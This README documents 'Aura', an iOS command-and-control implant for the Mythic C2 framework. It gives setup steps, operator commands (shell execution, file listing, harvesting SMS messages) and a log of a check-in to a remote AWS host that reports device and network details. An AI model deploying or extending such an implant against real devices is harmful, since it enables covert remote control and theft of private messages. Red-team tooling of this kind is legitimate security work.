# [DRAFT] Aura iOS Agent


## Description
Aura is an iOS payload designed to interact with a Mythic C2 (command and control) server and was developed over the [2024 Microsoft Global Hackathon](https://microsoft.sharepoint.com/sites/MicrosoftGlobalHackathon2024). To fit within the time constraint of one week:
* The agent communicates over plain text HTTP channels
* Mythic will manage and initate the agent builds per-usual, but the actual compilation and configuration of the agent will take place remotely on macOS w/iOS SDK outside of Docker.
* A limited number of commands will be implemented.

### Requirements
* iOS 12


## Warnings
* The Aura agent currently only supports plain-text HTTP comms.
* This is a development build only requiring a macOS build server for iOS compilation.
    * Mythic usually requires Agent code be hosted in Docker containers.


## Usage
1. Edit the Mythic environement file: `Mythic/.env` to:
    1. `MYTHIC_SERVER_BIND_LOCALHOST_ONLY="false"`
    2. `RABBITMQ_BIND_LOCALHOST_ONLY="false”`
    3. Grab the password for RabbitMQ
2. Start [Mythic C2](https://github.com/its-a-feature/Mythic) (you'll need to have this already)
3. Clone this repository
4. Edit `Payload_Type/rabbitmq_config.json` with the values from the Mythic server
5. Run `python Payload_Type/main.py` 
6. 🥳 In the Mythic UI you can now build and install Aura!!

## Operator commands
| Description | Implemented Command |
| - | - |
| Execute a shell command | `shell_exec [args]` |
| List a file | `ls [args]` |
| Read and correlate SMS messages | `messages` |
| Exit and uninstall the Agent | `exit` |

## Execution example
```txt
2024-09-20 18:13:33.914 aura[2322:270194] 👋 Hello from the Aura iOS agent!
2024-09-20 18:13:33.916 aura[2322:270194] [DEBUG] Check-in URL: http://ec2-54-245-60-126.us-west-2.compute.amazonaws.com:80/agent_message
2024-09-20 18:13:34.027 aura[2322:270194] {
    action = checkin;
    architecture = arm64;
    domain = local;
    "external_ip" = "136.24.173.189";
    host = "brandontonsipad.localdomain";
    "integrity_level" = 2;
    ips =     (
        "192.168.0.18"
    );
    os = "iOS 12.5.7";
    pid = 2322;
    "process_name" = aura;
    user = mobile;
    uuid = "b355bc11-0c78-41ec-b3b7-7220561137fa";
}
```